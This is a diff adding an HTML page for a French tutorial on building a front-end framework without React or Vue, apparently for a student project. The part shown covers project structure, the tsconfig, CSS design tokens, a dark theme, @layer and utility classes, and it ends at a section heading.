@@ -1,0 +1,1509 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Framework front maison — HTML, CSS & TypeScript | learn-to-dev</title>
+<meta name="description" content="Construire son propre framework front (design system CSS utilitaire, composants, store, routeur, API) en HTML, CSS et TypeScript, sans React ni Vue.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Syne:wght@600;700;800&display=swap" rel="stylesheet">
+    <style>
+    :root{
+      --bg:#0d1117;--bg2:#131a24;--surface:#18212e;--border:#273244;--text:#e6edf3;--muted:#8b98a9;
+      --accent:#7c6cff;--accent2:#22d3ee;--ok:#3fb950;--warn:#f0b429;--danger:#f85149;--info:#58a6ff;
+      --code-bg:#0a0e14;--sidebar:280px;
+    }
+    *{box-sizing:border-box}
+    html{scroll-behavior:smooth}
+    body{margin:0;background:var(--bg);color:var(--text);font:16px/1.7 "Inter",system-ui,sans-serif}
+    h1,h2,h3,.brand{font-family:"Syne",sans-serif;line-height:1.2}
+    h1{font-size:2.3rem;margin:.2rem 0 1rem;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent}
+    h2{font-size:1.5rem;margin:2.6rem 0 1rem;padding-bottom:.4rem;border-bottom:1px solid var(--border)}
+    h3{font-size:1.15rem;margin:1.8rem 0 .6rem;color:var(--accent2)}
+    a{color:var(--accent2)}
+    p code,li code,td code,.callout code{font-family:"JetBrains Mono",monospace;font-size:.86em;background:#1f2a3a;padding:.1em .4em;border-radius:4px;color:#ffb4e1}
+    .progress{position:fixed;top:0;left:0;height:3px;width:0;background:linear-gradient(90deg,var(--accent),var(--accent2));z-index:20;transition:width .1s}
+    .layout{display:grid;grid-template-columns:var(--sidebar) minmax(0,1fr);min-height:100vh}
+    .sidebar{position:sticky;top:0;height:100vh;overflow:auto;background:var(--bg2);border-right:1px solid var(--border);padding:1.5rem 1rem}
+    .brand{font-weight:800;font-size:1.15rem;margin:0 .5rem .3rem}
+    .brand span{font-family:"JetBrains Mono",monospace;color:var(--accent2);font-weight:500}
+    .subtitle{color:var(--muted);font-size:.82rem;margin:0 .5rem 1.4rem}
+    .steps-meter{margin:0 .5rem 1.2rem;font:500 .78rem "JetBrains Mono",monospace;color:var(--muted)}
+    .steps-meter .bar{height:6px;background:var(--surface);border-radius:99px;margin-top:.4rem;overflow:hidden}
+    .steps-meter .bar i{display:block;height:100%;width:0;background:var(--ok);transition:width .3s}
+    [role=tablist]{display:flex;flex-direction:column;gap:2px}
+    [role=tab]{all:unset;display:flex;align-items:center;gap:.7rem;padding:.55rem .7rem;border-radius:8px;cursor:pointer;color:var(--muted);font-size:.92rem}
+    [role=tab]:hover{background:var(--surface);color:var(--text)}
+    [role=tab]:focus-visible{outline:2px solid var(--accent2)}
+    [role=tab][aria-selected=true]{background:linear-gradient(90deg,#7c6cff33,transparent);color:var(--text);box-shadow:inset 3px 0 var(--accent)}
+    .num{flex:none;width:1.7rem;height:1.7rem;display:grid;place-items:center;border-radius:50%;border:1px solid var(--border);font:600 .75rem "JetBrains Mono",monospace}
+    [role=tab].done .num{background:var(--ok);border-color:var(--ok);color:#0d1117}
+    main{padding:3rem clamp(1.2rem,5vw,4.5rem) 5rem;max-width:980px;width:100%}
+    .kicker{font:600 .8rem "JetBrains Mono",monospace;letter-spacing:.12em;text-transform:uppercase;color:var(--accent2);margin:0}
+    .lead{font-size:1.12rem;color:#c3cfdb}
+    [role=tabpanel][hidden]{display:none}
+    table{width:100%;border-collapse:collapse;margin:1.2rem 0;font-size:.92rem;background:var(--surface);border-radius:10px;overflow:hidden}
+    th,td{padding:.65rem .85rem;text-align:left;border-bottom:1px solid var(--border);vertical-align:top}
+    th{background:#1f2a3a;font-family:"Syne",sans-serif;font-size:.85rem;color:var(--accent2)}
+    tr:last-child td{border-bottom:0}
+    .code{margin:1.2rem 0;border:1px solid var(--border);border-radius:10px;overflow:hidden;background:var(--code-bg)}
+    .code-head{display:flex;justify-content:space-between;align-items:center;padding:.45rem .9rem;background:#121923;border-bottom:1px solid var(--border)}
+    .code-title{font:500 .78rem "JetBrains Mono",monospace;color:var(--muted)}
+    .copy{font:500 .75rem "JetBrains Mono",monospace;background:var(--surface);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:.2rem .65rem;cursor:pointer}
+    .copy:hover{border-color:var(--accent)}
+    .copy.ok{color:var(--ok);border-color:var(--ok)}
+    pre{margin:0;padding:1rem 1.1rem;overflow:auto;font:400 .84rem/1.65 "JetBrains Mono",monospace;tab-size:2}
+    .t-com{color:#6a7a8c;font-style:italic}.t-str{color:#a5d6a7}.t-kw{color:#c792ea}.t-num{color:#f78c6c}.t-type{color:#ffcb6b}.t-fn{color:#82aaff}
+    .t-tag{color:#f07178}.t-attr{color:#ffcb6b}.t-prop{color:#82aaff}.t-var{color:#89ddff}.t-at{color:#c792ea}.t-sel{color:#f07178}
+    .callout{margin:1.4rem 0;padding:1rem 1.2rem;border-radius:10px;border:1px solid;border-left-width:4px}
+    .callout p{margin:.3rem 0 0}.callout ul{margin:.3rem 0 0;padding-left:1.2rem}
+    .callout-title{font-weight:700;font-family:"Syne",sans-serif}
+    .callout.tip{background:#3fb95012;border-color:#3fb95066}.callout.tip .callout-title{color:var(--ok)}
+    .callout.warn{background:#f0b42912;border-color:#f0b42966}.callout.warn .callout-title{color:var(--warn)}
+    .callout.danger{background:#f8514912;border-color:#f8514966}.callout.danger .callout-title{color:var(--danger)}
+    .callout.info{background:#58a6ff12;border-color:#58a6ff66}.callout.info .callout-title{color:var(--info)}
+    .callout.todo{background:#7c6cff16;border-color:#7c6cff77}.callout.todo .callout-title{color:var(--accent)}
+    .nav-steps{display:flex;justify-content:space-between;gap:1rem;margin-top:3.5rem;padding-top:1.5rem;border-top:1px solid var(--border)}
+    .nav-steps button{font:600 .9rem "Syne",sans-serif;background:var(--surface);color:var(--text);border:1px solid var(--border);border-radius:10px;padding:.8rem 1.2rem;cursor:pointer}
+    .nav-steps button:hover{border-color:var(--accent)}
+    .nav-steps button[hidden]{display:block;visibility:hidden}
+    .roadmap li,.checklist li{margin:.45rem 0}
+    .checklist{list-style:none;padding:0}
+    .checklist li::before{content:"☐";margin-right:.6rem;color:var(--accent2)}
+    /* playground */
+    .playground,.demo{margin:1.2rem 0;border:1px solid var(--border);border-radius:12px;background:var(--surface);padding:1.1rem}
+    .pg-controls{display:flex;flex-wrap:wrap;gap:.4rem .9rem;margin-bottom:1rem;font:500 .8rem "JetBrains Mono",monospace}
+    .pg-controls label{display:flex;gap:.35rem;align-items:center;cursor:pointer}
+    .pg-stage{background:#e9edf5;border-radius:10px;padding:1.4rem;color:#1b2333}
+    .pgc{display:block;font-family:"Inter",sans-serif;transition:all .2s}
+    .pgc>*{display:block}
+    .pgc.flex{display:flex}.pgc.items-center{align-items:center}.pgc.justify-between{justify-content:space-between}.pgc.gap-4{gap:1rem}
+    .pgc.p-4{padding:1rem}.pgc.p-6{padding:1.5rem}.pgc.bg-surface{background:#fff}.pgc.border{border:1px solid #d5dbe6}
+    .pgc.rounded{border-radius:8px}.pgc.shadow{box-shadow:0 4px 12px #1b233322}
+    .pgc.stack-2>*+*{margin-top:.5rem}.pgc.flex.stack-2>*+*{margin-top:0}
+    .pg-badge{width:max-content;padding:.15rem .55rem;border-radius:99px;background:#f0b42926;color:#a06a00;font-size:.75rem;font-weight:700}
+    .pg-muted{color:#6b778a;font-size:.88rem}
+    .pg-output{display:block;margin-top:.9rem;font:500 .82rem "JetBrains Mono",monospace;color:#ffb4e1;word-break:break-all}
+    .demo-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
+    .demo-card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:1rem}
+    .demo-card h4{margin:0 0 .4rem;font-family:"Syne",sans-serif}
+    .demo-card .big{font:700 2rem "JetBrains Mono",monospace;color:var(--accent2)}
+    .demo-card button{margin:.3rem .3rem 0 0;font:600 .85rem "Inter",sans-serif;background:var(--accent);color:#fff;border:0;border-radius:8px;padding:.45rem .8rem;cursor:pointer}
+    .demo-card button.ghost{background:transparent;border:1px solid var(--border);color:var(--text)}
+    .demo-log{margin-top:1rem;background:var(--code-bg);border-radius:8px;max-height:150px;font-size:.78rem;color:var(--muted)}
+    /* quiz */
+    .q{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1.1rem 1.2rem;margin:1rem 0}
+    .q-title{font-weight:600;margin:0 0 .7rem}
+    .q-opt{display:block;width:100%;text-align:left;font:inherit;font-size:.93rem;color:var(--text);background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:.55rem .8rem;margin:.35rem 0;cursor:pointer}
+    .q-opt:hover:not(:disabled){border-color:var(--accent)}
+    .q-opt.right{border-color:var(--ok);background:#3fb95022}
+    .q-opt.wrong{border-color:var(--danger);background:#f8514922}
+    .q-opt:disabled{cursor:default}
+    .q-exp{margin:.6rem 0 0;font-size:.9rem;color:#c3cfdb}
+    .q-score{margin-top:1.4rem;padding:1.2rem;border-radius:12px;background:linear-gradient(90deg,#7c6cff22,#22d3ee22);border:1px solid var(--accent);display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap}
+    .q-score strong{font:800 1.5rem "Syne",sans-serif}
+    .q-score button{font:600 .9rem "Syne",sans-serif;background:var(--accent);color:#fff;border:0;border-radius:8px;padding:.6rem 1rem;cursor:pointer}
+    .menu-btn{display:none}
+    @media (max-width:900px){
+      .layout{grid-template-columns:minmax(0,1fr)}
+      main{padding-top:4rem}
+      table{display:block;overflow-x:auto}
+      .sidebar{position:fixed;inset:0 auto 0 0;width:min(85vw,300px);transform:translateX(-100%);transition:transform .25s;z-index:15}
+      .sidebar.open{transform:none}
+      .menu-btn{display:block;position:fixed;top:.8rem;right:.8rem;z-index:16;background:var(--surface);color:var(--text);border:1px solid var(--border);border-radius:8px;padding:.5rem .8rem;font:600 .85rem "Syne",sans-serif}
+      .demo-grid{grid-template-columns:1fr}
+      h1{font-size:1.8rem}
+    }
+    </style>
+</head>
+
+<body>
+<div class="progress" aria-hidden="true"></div>
+<button class="menu-btn" type="button">☰ Étapes</button>
+<div class="layout">
+<aside class="sidebar">
+  <div class="brand">Framework <span>maison</span></div>
+  <p class="subtitle">HTML · CSS · TypeScript — projet IntraVerse</p>
+  <div class="steps-meter"><span id="meter-text"></span><div class="bar"><i id="meter-bar"></i></div></div>
+  <nav role="tablist" aria-label="Étapes du cours" aria-orientation="vertical">
+<button role="tab" id="tab-intro" aria-controls="intro" data-short="Introduction"><span class="num">1</span>Introduction</button>
+<button role="tab" id="tab-tokens" aria-controls="tokens" data-short="Design tokens"><span class="num">2</span>Design tokens</button>
+<button role="tab" id="tab-utilities" aria-controls="utilities" data-short="Classes utilitaires"><span class="num">3</span>Classes utilitaires</button>
+<button role="tab" id="tab-dom" aria-controls="dom" data-short="TypeScript &amp; DOM"><span class="num">4</span>TypeScript &amp; DOM</button>
+<button role="tab" id="tab-components" aria-controls="components" data-short="Composants"><span class="num">5</span>Composants</button>
+<button role="tab" id="tab-store" aria-controls="store" data-short="État réactif"><span class="num">6</span>État réactif</button>
+<button role="tab" id="tab-router" aria-controls="router" data-short="Routeur SPA"><span class="num">7</span>Routeur SPA</button>
+<button role="tab" id="tab-api" aria-controls="api" data-short="API &amp; auth"><span class="num">8</span>API &amp; auth</button>
+<button role="tab" id="tab-forms" aria-controls="forms" data-short="Formulaires"><span class="num">9</span>Formulaires</button>
+<button role="tab" id="tab-recap" aria-controls="recap" data-short="Récap &amp; quiz"><span class="num">10</span>Récap &amp; quiz</button>
+  </nav>
+</aside>
+<main>
+<section role="tabpanel" id="intro" aria-labelledby="tab-intro" hidden>
+<p class="kicker">Étape 1</p>
+<h1>Construire son framework front maison</h1>
+<p class="lead">HTML sémantique, CSS et TypeScript, sans React ni Vue. Dans IntraVerse, tu dois coder toi-même ce qu'un framework te donne d'habitude : un design system, des composants, un état partagé, un routeur et une couche d'accès à l'API.</p>
+
+<div class="callout warn"><div class="callout-title">⚠️ La règle du projet</div><p>Le sujet interdit les IA génératrices de code et les frameworks frontend. Ce cours te sert à <strong>comprendre les mécanismes</strong> : les exemples sont volontairement génériques (compteur, formulaire…). Le code d'IntraVerse, c'est toi qui l'écris, à partir de ces principes. Chaque étape se termine par un exercice « À toi de jouer » pour ça.</p></div>
+
+<h2>Ce que fait un framework pour toi</h2>
+<p>Tu connais React. Chaque chose que React fait en coulisses, tu vas devoir la reconstruire en version simple :</p>
+<table>
+<thead><tr><th>Besoin</th><th>Avec React</th><th>Dans ton framework maison</th></tr></thead>
+<tbody>
+<tr><td>Style cohérent</td><td>Tailwind / CSS Modules</td><td>Variables CSS + classes utilitaires écrites à la main</td></tr>
+<tr><td>Créer des éléments</td><td>JSX</td><td>Une fonction <code>h('div', props, ...enfants)</code></td></tr>
+<tr><td>Composants</td><td>Fonctions + props</td><td>Une classe abstraite <code>Component&lt;Props&gt;</code></td></tr>
+<tr><td>État</td><td><code>useState</code>, Context</td><td>Un <code>Store</code> avec <code>subscribe()</code> (pattern Observer)</td></tr>
+<tr><td>Re-render</td><td>Automatique (Virtual DOM)</td><td>Manuel : <code>component.update()</code> quand le store change</td></tr>
+<tr><td>Navigation</td><td>React Router</td><td>Un <code>Router</code> basé sur l'History API</td></tr>
+<tr><td>Nettoyage</td><td>Retour de <code>useEffect</code></td><td><code>AbortController</code> + <code>unmount()</code></td></tr>
+<tr><td>Appels API</td><td>fetch / TanStack Query</td><td>Une fonction <code>api&lt;T&gt;()</code> typée</td></tr>
+</tbody>
+</table>
+
+<h2>L'architecture</h2>
+<p>On sépare le <strong>noyau</strong> (le framework, réutilisable dans n'importe quel projet) de l'<strong>application</strong> (les pages d'IntraVerse). C'est la même idée qu'un <code>vendor/</code> en Symfony : le noyau ne connaît rien du métier.</p>
+<div class="code"><div class="code-head"><span class="code-title">Arborescence</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-txt">front/
+├── public/                 ← ce que le serveur envoie au navigateur
+│   ├── index.html
+│   ├── css/
+│   │   ├── tokens.css      ← variables (couleurs, typo, espacements)
+│   │   ├── base.css        ← reset + styles des balises
+│   │   ├── components.css  ← .btn, .card, .badge…
+│   │   └── utilities.css   ← .flex, .p-4, .text-muted…
+│   └── js/                 ← généré par tsc (ne pas éditer)
+├── src/
+│   ├── core/               ← TON FRAMEWORK
+│   │   ├── dom.ts          ← h(), $()
+│   │   ├── component.ts
+│   │   ├── store.ts
+│   │   ├── router.ts
+│   │   └── api.ts
+│   ├── components/         ← composants réutilisables de l&#x27;app
+│   ├── pages/              ← une page = une vue du routeur
+│   ├── types/              ← DTO partagés avec l&#x27;API
+│   └── main.ts             ← point d&#x27;entrée
+└── tsconfig.json</code></pre></div>
+
+<h2>Compiler TypeScript sans bundler</h2>
+<p>Le navigateur ne comprend pas le TypeScript. Sans Vite ni webpack, c'est <code>tsc</code> qui transforme <code>src/**/*.ts</code> en <code>public/js/**/*.js</code>, et le navigateur charge directement les modules ES.</p>
+<div class="code"><div class="code-head"><span class="code-title">tsconfig.json</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-json">{
+  &quot;compilerOptions&quot;: {
+    &quot;target&quot;: &quot;es2022&quot;,
+    &quot;module&quot;: &quot;esnext&quot;,
+    &quot;moduleResolution&quot;: &quot;bundler&quot;,
+    &quot;lib&quot;: [&quot;es2022&quot;, &quot;dom&quot;, &quot;dom.iterable&quot;],
+    &quot;rootDir&quot;: &quot;./src&quot;,
+    &quot;outDir&quot;: &quot;./public/js&quot;,
+    &quot;strict&quot;: true,
+    &quot;noUncheckedIndexedAccess&quot;: true,
+    &quot;sourceMap&quot;: true
+  },
+  &quot;include&quot;: [&quot;src&quot;]
+}</code></pre></div>
+<table>
+<thead><tr><th>Option</th><th>Pourquoi</th></tr></thead>
+<tbody>
+<tr><td><code>module: esnext</code></td><td>Garde les <code>import</code>/<code>export</code> : le navigateur les gère nativement.</td></tr>
+<tr><td><code>moduleResolution: bundler</code></td><td>Mode moderne. Depuis TypeScript 6/7, <code>node</code>/<code>node10</code> ne sont plus acceptés.</td></tr>
+<tr><td><code>lib: dom</code></td><td>Donne les types <code>HTMLElement</code>, <code>Event</code>, <code>fetch</code>…</td></tr>
+<tr><td><code>strict</code> + <code>noUncheckedIndexedAccess</code></td><td><code>strict</code> est déjà le défaut en TS 7 ; la seconde option te force à gérer le cas « case de tableau vide ».</td></tr>
+<tr><td><code>sourceMap</code></td><td>Dans les DevTools, tu débugues ton <code>.ts</code> et non le <code>.js</code> généré.</td></tr>
+</tbody>
+</table>
+
+<div class="callout danger"><div class="callout-title">⛔ Le piège n°1 : l'extension dans les imports</div><p>Le navigateur ne devine pas les extensions. Écris tes imports <strong>avec <code>.js</code></strong>, même dans un fichier <code>.ts</code> : <code>import { h } from '../core/dom.js'</code>. TypeScript comprend qu'il s'agit de <code>dom.ts</code>, et le fichier généré pointe vers le bon fichier. Sans l'extension, tu auras une erreur 404 dans la console.</p></div>
+
+<div class="code"><div class="code-head"><span class="code-title">public/index.html</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-html">&lt;!doctype html&gt;
+&lt;html lang=&quot;fr&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;utf-8&quot;&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+  &lt;title&gt;IntraVerse&lt;/title&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/tokens.css&quot;&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/base.css&quot;&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/components.css&quot;&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/utilities.css&quot;&gt;
+  &lt;script type=&quot;module&quot; src=&quot;/js/main.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;header class=&quot;app-header&quot;&gt;…&lt;/header&gt;
+  &lt;main id=&quot;app&quot; tabindex=&quot;-1&quot;&gt;&lt;/main&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></div>
+<p><code>type="module"</code> fait trois choses : il active les <code>import</code>, il exécute le script après le parsing du HTML (comme <code>defer</code>), et il active le mode strict JS.</p>
+<div class="code"><div class="code-head"><span class="code-title">Terminal</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-bash">npm i -D typescript
+npx tsc --watch      # recompile à chaque sauvegarde</code></pre></div>
+
+<div class="callout todo"><div class="callout-title">🛠️ À toi de jouer</div><p>Crée le dossier <code>front/</code> de ton dépôt <code>intra-ts</code> avec cette arborescence, un <code>main.ts</code> qui fait <code>console.log('IntraVerse')</code>, et vérifie que le message s'affiche dans la console du navigateur.</p></div>
+</section>
+<section role="tabpanel" id="tokens" aria-labelledby="tab-tokens" hidden>
+<p class="kicker">Étape 2</p>
+<h1>Les design tokens en variables CSS</h1>
+<p class="lead">Ton « Manifeste UI » (palette, échelle typographique, espacements) devient un fichier <code>tokens.css</code>. Toutes les autres règles CSS utilisent ces variables, jamais de valeurs en dur.</p>
+
+<h2>Deux niveaux de variables</h2>
+<p>On distingue les tokens <strong>bruts</strong> (« bleu 500 ») des tokens <strong>sémantiques</strong> (« couleur principale »). Les composants n'utilisent que les sémantiques. Pour créer un thème sombre, il suffit de changer ce que pointent les sémantiques.</p>
+<div class="code"><div class="code-head"><span class="code-title">public/css/tokens.css</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-css">:root {
+  /* ── Couleurs en HSL : teinte, saturation, luminosité ── */
+  --hue-primary: 228;
+  --hue-secondary: 280;
+
+  --color-primary:      hsl(var(--hue-primary) 85% 56%);
+  --color-primary-hover: hsl(var(--hue-primary) 85% 48%);
+  --color-secondary:    hsl(var(--hue-secondary) 70% 60%);
+
+  --color-bg:           hsl(220 20% 98%);
+  --color-surface:      hsl(0 0% 100%);
+  --color-border:       hsl(220 14% 88%);
+  --color-text:         hsl(222 30% 14%);
+  --color-text-muted:   hsl(220 10% 45%);
+
+  --color-success:      hsl(145 60% 38%);
+  --color-danger:       hsl(355 75% 52%);
+  --color-warning:      hsl(38 95% 50%);
+
+  /* ── Typographie (rem : relatif à la taille choisie par l&#x27;utilisateur) ── */
+  --font-sans: &quot;Inter&quot;, system-ui, sans-serif;
+  --font-mono: &quot;JetBrains Mono&quot;, ui-monospace, monospace;
+  --text-xs:   0.75rem;   /* 12px */
+  --text-sm:   0.875rem;  /* 14px */
+  --text-base: 1rem;      /* 16px */
+  --text-lg:   1.25rem;   /* 20px */
+  --text-xl:   1.5rem;    /* 24px */
+  --text-2xl:  2rem;      /* 32px */
+
+  /* ── Espacements : base 4px ── */
+  --space-1: 0.25rem;  /* 4px */
+  --space-2: 0.5rem;   /* 8px */
+  --space-3: 0.75rem;  /* 12px */
+  --space-4: 1rem;     /* 16px */
+  --space-6: 1.5rem;   /* 24px */
+  --space-8: 2rem;     /* 32px */
+  --space-12: 3rem;    /* 48px */
+
+  /* ── Divers ── */
+  --radius-sm: 4px;
+  --radius-md: 8px;
+  --radius-full: 999px;
+  --shadow-sm: 0 1px 2px hsl(220 30% 10% / 0.08);
+  --shadow-md: 0 4px 12px hsl(220 30% 10% / 0.12);
+  --transition: 150ms ease;
+}</code></pre></div>
+
+<h2>Pourquoi HSL plutôt que HEX ?</h2>
+<p>Le sujet accepte les deux. HSL a un avantage concret : pour faire la variante « hover » d'un bouton, tu baisses juste la luminosité. En HEX, tu dois recalculer une couleur à la main.</p>
+<table>
+<thead><tr><th></th><th>HEX</th><th>HSL</th></tr></thead>
+<tbody>
+<tr><td>Lisibilité</td><td><code>#3D5AF1</code> : illisible</td><td><code>hsl(228 85% 56%)</code> : « bleu, saturé, moyen »</td></tr>
+<tr><td>Variante plus foncée</td><td>Recalculer une couleur</td><td>Changer le dernier %</td></tr>
+<tr><td>Transparence</td><td><code>#3D5AF180</code></td><td><code>hsl(228 85% 56% / 0.5)</code></td></tr>
+<tr><td>Changer toute la teinte du site</td><td>Toutes les couleurs à refaire</td><td>Modifier <code>--hue-primary</code></td></tr>
+</tbody>
+</table>
+
+<h2>Le thème sombre (feature bonus)</h2>
+<p>On redéfinit seulement les tokens sémantiques sous un attribut. Aucun composant ne change.</p>
+<div class="code"><div class="code-head"><span class="code-title">tokens.css (suite)</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-css">[data-theme=&quot;dark&quot;] {
+  --color-bg:         hsl(225 25% 8%);
+  --color-surface:    hsl(225 20% 12%);
+  --color-border:     hsl(225 15% 22%);
+  --color-text:       hsl(220 20% 92%);
+  --color-text-muted: hsl(220 10% 62%);
+  --color-primary:    hsl(var(--hue-primary) 90% 66%);
+}
+
+/* Respecte le réglage du système si l&#x27;utilisateur n&#x27;a rien choisi */
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme=&quot;light&quot;]) {
+    --color-bg: hsl(225 25% 8%);
+    /* … mêmes valeurs que ci-dessus */
+  }
+}</code></pre></div>
+<div class="code"><div class="code-head"><span class="code-title">Basculer le thème en TypeScript</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">const root = document.documentElement;
+root.dataset.theme = root.dataset.theme === &#x27;dark&#x27; ? &#x27;light&#x27; : &#x27;dark&#x27;;</code></pre></div>
+
+<h2>Organiser la cascade avec <code>@layer</code></h2>
+<p>Problème classique : une classe utilitaire <code>.mt-0</code> doit toujours gagner sur <code>.card</code>, même si <code>.card</code> est déclarée plus bas. <code>@layer</code> fixe l'ordre de priorité une fois pour toutes : la dernière couche déclarée gagne, peu importe la spécificité des sélecteurs.</p>
+<div class="code"><div class="code-head"><span class="code-title">Les couches</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-css">/* En haut de tokens.css : l&#x27;ordre de priorité, du plus faible au plus fort */
+@layer reset, base, components, utilities;
+
+/* Puis dans chaque fichier */
+@layer components {
+  .card { margin-top: var(--space-4); }
+}
+@layer utilities {
+  .mt-0 { margin-top: 0; }   /* gagne toujours sur .card */
+}</code></pre></div>
+<div class="callout tip"><div class="callout-title">💡 Le même principe que Tailwind</div><p>Tailwind utilise exactement ces trois couches (<code>base</code>, <code>components</code>, <code>utilities</code>). Tu reproduis son fonctionnement, sans CLI ni PostCSS : c'est ce que le sujet appelle un « mini-Tailwind ».</p></div>
+
+<div class="callout todo"><div class="callout-title">🛠️ À toi de jouer</div><p>Reporte ta palette Figma dans <code>tokens.css</code> avec les 10 couleurs imposées (Primary, Secondary, Background, Surface, Border, Text-primary, Text-muted, Success, Danger, Warning), ton échelle typographique en rem et ton échelle d'espacement en base 4px. Vérifie les contrastes texte/fond (4,5:1 minimum) avec l'outil Contrast de Firefox ou de Chrome DevTools.</p></div>
+</section>
+<section role="tabpanel" id="utilities" aria-labelledby="tab-utilities" hidden>
+<p class="kicker">Étape 3</p>
+<h1>Le mini-Tailwind : classes utilitaires et composants CSS</h1>
+<p class="lead">Une classe utilitaire fait <strong>une seule chose</strong> (<code>.p-4</code> = padding de 16px). En les combinant dans le HTML, tu construis n'importe quelle mise en page sans écrire de nouveau CSS.</p>
+
+<h2>Une convention de nommage, et s'y tenir</h2>
+<table>
+<thead><tr><th>Famille</th><th>Classes</th><th>Propriété</th></tr></thead>
+<tbody>
+<tr><td>Espacement</td><td><code>.p-4 .px-2 .py-6 .m-0 .mt-4 .gap-2</code></td><td>padding, margin, gap (valeurs = <code>--space-N</code>)</td></tr>
+<tr><td>Layout</td><td><code>.flex .grid .items-center .justify-between .wrap</code></td><td>display, align-items, justify-content</td></tr>
+<tr><td>Grille</td><td><code>.grid-cols-2 .grid-cols-3 .col-span-2</code></td><td>grid-template-columns</td></tr>
+<tr><td>Pile verticale</td><td><code>.stack-2 .stack-4</code></td><td>Espacement régulier entre enfants</td></tr>
+<tr><td>Texte</td><td><code>.text-sm .text-lg .font-bold .text-muted .truncate</code></td><td>font-size, color…</td></tr>
+<tr><td>Fond / bordure</td><td><code>.bg-surface .border .rounded .shadow</code></td><td>background, border, radius</td></tr>
+<tr><td>Accessibilité</td><td><code>.sr-only</code></td><td>Visible seulement par les lecteurs d'écran</td></tr>
+</tbody>
+</table>
+
+<div class="code"><div class="code-head"><span class="code-title">public/css/utilities.css</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-css">@layer utilities {
+  /* Layout */
+  .flex  { display: flex; }
+  .grid  { display: grid; }
+  .wrap  { flex-wrap: wrap; }
+  .items-center    { align-items: center; }
+  .justify-between { justify-content: space-between; }
+  .grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+  .grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+
+  /* Espacements : toujours via les tokens */
+  .gap-2 { gap: var(--space-2); }
+  .gap-4 { gap: var(--space-4); }
+  .p-2   { padding: var(--space-2); }
+  .p-4   { padding: var(--space-4); }
+  .p-6   { padding: var(--space-6); }
+  .mt-4  { margin-top: var(--space-4); }
+  .m-0   { margin: 0; }
+
+  /* Pile : espace entre enfants directs, pas avant le premier */
+  .stack-2 &gt; * + * { margin-top: var(--space-2); }
+  .stack-4 &gt; * + * { margin-top: var(--space-4); }
+
+  /* Texte */
+  .text-sm    { font-size: var(--text-sm); }
+  .text-lg    { font-size: var(--text-lg); }
+  .font-bold  { font-weight: 700; }
+  .text-muted { color: var(--color-text-muted); }
+  .truncate   { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+  /* Surfaces */
+  .bg-surface { background: var(--color-surface); }
+  .border     { border: 1px solid var(--color-border); }
+  .rounded    { border-radius: var(--radius-md); }
+  .shadow     { box-shadow: var(--shadow-md); }
+
+  .sr-only {
+    position: absolute; width: 1px; height: 1px;
+    overflow: hidden; clip-path: inset(50%); white-space: nowrap;
+  }
+}</code></pre></div>
+
+<h2>Le responsive : des préfixes comme Tailwind</h2>
+<p>On écrit le style <strong>mobile d'abord</strong>, puis on ajoute des classes préfixées qui ne s'appliquent qu'au-dessus d'une largeur. Le <code>:</code> dans un nom de classe doit être échappé avec <code>\</code> dans le CSS, mais pas dans le HTML.</p>
+<div class="code"><div class="code-head"><span class="code-title">utilities.css (suite)</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-css">@layer utilities {
+  @media (min-width: 768px) {
+    .md\:grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+    .md\:flex        { display: flex; }
+    .md\:hidden      { display: none; }
+  }
+  @media (min-width: 1024px) {
+    .lg\:grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+  }
+}</code></pre></div>
+<div class="code"><div class="code-head"><span class="code-title">Utilisation</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-html">&lt;!-- 1 colonne sur mobile, 2 sur tablette, 3 sur ordinateur --&gt;
+&lt;section class=&quot;grid gap-4 md:grid-cols-2 lg:grid-cols-3&quot;&gt;
+  &lt;article class=&quot;card&quot;&gt;…&lt;/article&gt;
+  &lt;article class=&quot;card&quot;&gt;…&lt;/article&gt;
+  &lt;article class=&quot;card&quot;&gt;…&lt;/article&gt;
+&lt;/section&gt;</code></pre></div>
+<div class="callout warn"><div class="callout-title">⚠️ Les variables CSS ne marchent pas dans les media queries</div><p><code>@media (min-width: var(--bp-md))</code> ne fonctionne pas. Les points de rupture doivent être écrits en dur. Note-les dans ton Manifeste UI pour rester cohérente.</p></div>
+
+<h2>Utilitaires ou composants CSS ?</h2>
